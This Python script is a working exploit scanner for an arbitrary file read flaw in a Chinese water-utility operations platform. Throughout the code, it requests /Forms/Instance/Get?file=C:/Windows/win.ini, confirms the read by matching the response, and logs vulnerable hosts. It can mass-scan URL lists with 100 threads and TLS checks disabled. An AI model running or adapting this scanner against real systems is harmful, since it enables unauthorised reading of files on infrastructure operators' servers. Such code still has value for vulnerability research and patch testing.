import argparse,requests,re,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def a():
    text="""
███████╗██╗██╗     ███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██████╔╝█████╗  ███████║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║     ██║███████╗███████╗    ██║  ██║███████╗██║  ██║██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                               
                                                         
"""
    print(text)

def poc(target):
    payloade="/Forms/Instance/Get?file=C:/Windows/win.ini"
    headers = {
        "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
    }
    try:
            res=requests.get(url=target,timeout=5,verify=False)
            if res.status_code==200:
                res1=requests.get(url=target+payloade,timeout=5,verify=False)
                if re.search('(fonts)',res1.text).group(0)=="fonts" and res1.status_code==200:  
                    print(f"[+]{target}存在文件读取漏洞")
                    with open("result.txt",'a',encoding="utf-8")as f:
                        f.write(target+'\n')
            else:
                print(f"[*]{target}访问出现问题，请手工注入")
    except:
          pass
       

def main():
    a()
    parse=argparse.ArgumentParser(description="森鑫炬水务企业综合运营平台 /Forms/Instance/Get 文件读取")
    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                urllist.append(i.strip())
        mp=Pool(100)
        mp.map(poc,urllist)
        mp.close
        mp.join
    else:
        print(f"Usage : Python {sys.argv[0]} -h") 

if __name__=="__main__":
    main()




